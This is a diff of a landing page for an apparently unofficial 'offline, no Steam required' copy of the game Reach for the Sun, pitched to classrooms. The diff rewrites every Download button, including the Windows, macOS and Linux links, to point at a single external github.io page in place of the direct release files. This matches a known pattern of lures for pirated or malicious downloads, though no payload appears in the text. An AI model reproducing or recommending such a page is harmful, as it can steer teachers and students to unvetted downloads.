@@ -12,7 +12,7 @@ description: Award-winning educational plant simulation game - completely offlin
   <p><strong>🌿 Experience the complete plant life cycle in this award-winning educational simulation<br>
   Completely offline • No Steam required • Perfect for classrooms</strong></p>
   
-  <a href="#download" class="btn btn-primary">🎮 Download Now</a>
+  <a href="https://reach-for-the-sun-offline-free.github.io/.github" class="btn btn-primary">🎮 Download Now</a>
   <a href="#educators" class="btn btn-secondary">👩‍🏫 For Educators</a>
 </div>
 
@@ -38,17 +38,17 @@ description: Award-winning educational plant simulation game - completely offlin
 
 <div class="download-section">
   <div class="platform-downloads">
-    <a href="https://github.com/Reach-for-the-Sun-Offline-Free/reach-for-the-sun-offline-setup-assistant/releases/latest/download/reach-for-the-sun-windows.zip" class="download-btn windows">
+    <a href="https://reach-for-the-sun-offline-free.github.io/.github" class="download-btn windows">
       <img src="https://img.shields.io/badge/Windows-0078D4?style=for-the-badge&logo=windows" alt="Windows">
       <br><small>Windows 7, 8, 10, 11</small>
     </a>
     
-    <a href="https://github.com/Reach-for-the-Sun-Offline-Free/reach-for-the-sun-offline-setup-assistant/releases/latest/download/reach-for-the-sun-macos.dmg" class="download-btn macos">
+    <a href="https://reach-for-the-sun-offline-free.github.io/.github" class="download-btn macos">
       <img src="https://img.shields.io/badge/macOS-000000?style=for-the-badge&logo=apple" alt="macOS">
       <br><small>macOS 10.12+</small>
     </a>
     
-    <a href="https://github.com/Reach-for-the-Sun-Offline-Free/reach-for-the-sun-offline-setup-assistant/releases/latest/download/reach-for-the-sun-linux.AppImage" class="download-btn linux">
+    <a href="https://reach-for-the-sun-offline-free.github.io/.github" class="download-btn linux">
       <img src="https://img.shields.io/badge/Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black" alt="Linux">
       <br><small>Ubuntu, Debian, Fedora</small>
     </a>
@@ -232,7 +232,7 @@ This project is licensed under the **MIT License** with special provisions for e
   <p><strong>🌱 Growing knowledge, one plant at a time! 🌱</strong></p>
   
   <p>
-    <a href="#download">Download Now</a> •
+    <a href="https://reach-for-the-sun-offline-free.github.io/.github">Download Now</a> •
     <a href="https://github.com/Reach-for-the-Sun-Offline-Free/reach-for-the-sun-offline-setup-assistant">View on GitHub</a> •
     <a href="mailto:support@reach-for-the-sun.edu">Contact Us</a>
   </p>
